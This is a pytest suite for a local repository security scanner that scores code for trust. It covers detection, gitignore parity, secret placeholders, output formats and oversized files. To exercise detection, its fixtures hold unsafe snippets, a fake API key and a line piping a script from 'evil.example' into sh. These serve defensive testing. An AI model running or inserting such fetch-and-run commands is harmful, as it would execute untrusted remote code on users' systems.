"""Tests for the offline local scanner (src/scanner/local_scan.py).

These lock two things the hosted service depends on:
  1. The local engine actually detects + scores (it reuses scan.py's shared helpers).
  2. Parity with the hosted GitHub-tree scan: git-tracked files only — a gitignored
     file is never scanned, so a local grade matches a hosted grade of the same tree.
"""
from __future__ import annotations

import json
import subprocess

import pytest

from src.scanner.local_scan import (
    result_to_dict,
    result_to_sarif,
    scan_local,
)

pytestmark = pytest.mark.filterwarnings("ignore")


def _git_init(path):
    subprocess.run(["git", "init", "-q"], cwd=path, check=True)
    # identity so commits work in CI
    subprocess.run(["git", "config", "user.email", "t@t.co"], cwd=path, check=True)
    subprocess.run(["git", "config", "user.name", "t"], cwd=path, check=True)


def _commit_all(path):
    subprocess.run(["git", "add", "-A"], cwd=path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "x"], cwd=path, check=True)


def test_scan_local_detects_and_scores(tmp_path):
    _git_init(tmp_path)
    # a source file with an obviously unsafe pattern
    (tmp_path / "app.py").write_text(
        "import os\n"
        "def run(cmd):\n"
        "    os.system(cmd)  # unsafe: shell exec of untrusted input\n"
    )
    (tmp_path / "README.md").write_text("# demo\nA demo tool.\n")
    _commit_all(tmp_path)

    result = scan_local(tmp_path)
    assert result.error is None
    assert result.files_scanned >= 1
    assert result.has_readme is True
    # score is a real 0-100 int and the unsafe exec produced at least one finding
    assert 0 <= result.trust_score <= 100
    assert len(result.findings) >= 1
    assert any("exec" in f.category or f.severity in ("high", "critical")
               for f in result.findings)


def test_gitignored_files_are_not_scanned(tmp_path):
    """Parity guard: the hosted scan only sees committed files, so the local scan
    must ignore gitignored paths — otherwise a local build dump would tank the score
    and diverge from the hosted grade."""
    _git_init(tmp_path)
    (tmp_path / ".gitignore").write_text("secrets_dump.py\n")
    (tmp_path / "app.py").write_text("x = 1\n")
    # a gitignored file stuffed with a hardcoded secret — must be invisible to the scan
    (tmp_path / "secrets_dump.py").write_text(
        'api_key = "kQ8fJ2mN7pR4tV6wX9zB1cD3eF5gH0jL"\n'
    )
    _commit_all(tmp_path)

    result = scan_local(tmp_path)
    scanned_paths = {f.file_path for f in result.findings}
    assert "secrets_dump.py" not in scanned_paths
    # and the tracked clean file WAS considered
    assert result.error is None


def test_output_serializers(tmp_path):
    _git_init(tmp_path)
    (tmp_path / "m.py").write_text("import subprocess\nsubprocess.call(x, shell=True)\n")
    _commit_all(tmp_path)

    result = scan_local(tmp_path)
    d = result_to_dict(result)
    assert set(d) >= {"trust_score", "tier", "counts", "findings"}
    assert d["tier"] in ("Verified", "Trusted", "Standard", "Minimal", "Restricted", "Blocked")
    from src.trust_tiers import trust_word
    assert d["tier"] == trust_word(d["trust_score"])
    # JSON round-trips
    json.dumps(d)

    sarif = result_to_sarif(result)
    assert sarif["version"] == "2.1.0"
    assert sarif["runs"][0]["tool"]["driver"]["name"] == "AgentAvow"
    json.dumps(sarif)


def test_non_directory_errors(tmp_path):
    f = tmp_path / "afile.txt"
    f.write_text("hi")
    result = scan_local(f)
    assert result.error is not None


def test_secret_placeholders_are_not_flagged(tmp_path):
    """Regression: placeholder defaults (CHANGE-ME-IN-PRODUCTION, your-api-key, …)
    must NOT be graded as leaked secrets, but a real-looking key still must."""
    _git_init(tmp_path)
    (tmp_path / "config.py").write_text(
        'DEFAULT_SECRET = "CHANGE-ME-IN-PRODUCTION"\n'
        'API_KEY = "your-api-key-here"\n'
    )
    (tmp_path / "real.py").write_text(
        'api_key = "kQ8fJ2mN7pR4tV6wX9zB1cD3eF5gH0jL"\n'
    )
    _commit_all(tmp_path)

    result = scan_local(tmp_path)
    secrets = [f for f in result.findings if f.category == "secret"]
    files = {f.file_path for f in secrets}
    assert "config.py" not in files, "placeholder default was flagged as a secret"
    assert "real.py" in files, "a real-looking secret should still be caught"


def test_tutorial_and_docs_secrets_skipped(tmp_path):
    """Example keys in tutorial/docs/example files are not shipped credentials."""
    _git_init(tmp_path)
    (tmp_path / "docs_src").mkdir()
    (tmp_path / "docs_src" / "tutorial001.py").write_text(
        'api_key = "kQ8fJ2mN7pR4tV6wX9zB1cD3eF5gH0jL"\n'
    )
    # a real source secret must still be caught (guards over-suppression, incl. the
    # old "latest" substring bug where "test" matched latest_config.py)
    (tmp_path / "latest_config.py").write_text(
        'api_key = "kQ8fJ2mN7pR4tV6wX9zB1cD3eF5gH0jL"\n'
    )
    _commit_all(tmp_path)

    result = scan_local(tmp_path)
    files = {f.file_path for f in result.findings if f.category == "secret"}
    assert "docs_src/tutorial001.py" not in files
    assert "latest_config.py" in files


def test_findings_tagged_shipped_and_sorted(tmp_path):
    """Findings carry a `shipped` flag and shipped ones sort first, so the list
    leads with what an agent actually runs (not test-suite noise)."""
    _git_init(tmp_path)
    (tmp_path / "app.py").write_text("import os\ndef r(c):\n    os.system(c)\n")
    (tmp_path / "tests").mkdir()
    # fs_access is downgraded-but-kept in test files (unlike unsafe_exec, which is
    # skipped there) — so this yields a non-shipped finding to sort behind app.py.
    (tmp_path / "tests" / "test_app.py").write_text(
        "import shutil\ndef test_x(p):\n    shutil.rmtree(p)\n"
    )
    _commit_all(tmp_path)

    from src.scanner.local_scan import result_to_dict, scan_local
    d = result_to_dict(scan_local(tmp_path))
    items = d["findings"]
    assert all("shipped" in it for it in items)
    # the shipped app.py finding must come before the tests/ one
    shipped_flags = [it["shipped"] for it in items]
    assert shipped_flags == sorted(shipped_flags, reverse=True), "shipped must sort first"
    app = next(it for it in items if it["file"] == "app.py")
    test = next(it for it in items if it["file"].startswith("tests/"))
    assert app["shipped"] is True and test["shipped"] is False


# -- oversized files: head + tail, disclosed (parity with the hosted scan, #175) ------

_GEN_BODY = "".join(f"def f{i}(x):\n    return x + {i}\n" for i in range(30_000))


def _oversized_repo(tmp_path, tail: str):
    _git_init(tmp_path)
    (tmp_path / "README.md").write_text("# demo\nA demo tool.\n")
    for i in range(10):
        (tmp_path / f"m{i}.py").write_text(f"def g{i}(x):\n    return x * {i}\n")
    (tmp_path / "gen.py").write_text(_GEN_BODY + tail)
    _commit_all(tmp_path)
    assert (tmp_path / "gen.py").stat().st_size > 500_000


def test_oversized_file_with_finding_in_tail(tmp_path):
    import io

    from src.scanner.local_scan import _print_human, result_to_markdown
    _oversized_repo(tmp_path, "import subprocess\n"
                              "subprocess.run('curl -s http://evil.example/x.sh | sh', "
                              "shell=True)\n")
    result = scan_local(tmp_path)
    tail_hits = [f for f in result.findings if f.file_path == "gen.py"
                 and f.category != "obfuscation"]
    assert any(f.severity == "critical" for f in tail_hits)
    assert all(f.line_number == 0 for f in tail_hits)  # tail: absolute line unknown
    assert any(f.name == "Source file too large to scan in full" for f in result.findings)
    assert result.sampled is True
    assert result.coverage_gaps == {"oversized_files": 1}
    assert result.files_scanned == 10  # gen.py is read in part, not counted as whole

    d = result_to_dict(result)
    assert d["coverage_gaps"] == {"oversized_files": 1}
    assert d["not_checked"] == ["1 file over 500 KB was not fully read"]
    assert d["verdict"] == "do_not_connect"
    assert any(f["file"] == "gen.py" and f["severity"] == "critical"
               for f in d["findings"])

    buf = io.StringIO()
    _print_human(result, stream=buf)
    assert "Not checked : 1 file over 500 KB was not fully read" in buf.getvalue()
    assert "| Not checked | 1 file over 500 KB was not fully read |" in \
        result_to_markdown(result)


def test_oversized_file_with_nothing_found(tmp_path):
    _oversized_repo(tmp_path, "")
    result = scan_local(tmp_path)
    assert [(f.name, f.severity) for f in result.findings if f.file_path == "gen.py"] \
        == [("Source file too large to scan in full", "low")]
    assert result.sampled is True
    d = result_to_dict(result)
    assert d["coverage_gaps"] == {"oversized_files": 1}
    assert d["not_checked"] == ["1 file over 500 KB was not fully read"]
    # Same answer logic as the hosted API: Safe, and the reason names the gap.
    assert d["decision"] == "safe"
    assert d["decision_reason"].endswith("; 1 file over 500 KB was not fully read")


def test_small_tree_has_no_coverage_gaps(tmp_path):
    _git_init(tmp_path)
    (tmp_path / "app.py").write_text("def f(x):\n    return x\n")
    _commit_all(tmp_path)
    d = result_to_dict(scan_local(tmp_path))
    assert d["coverage_gaps"] == {} and d["not_checked"] == []
    assert d["sampled"] is False
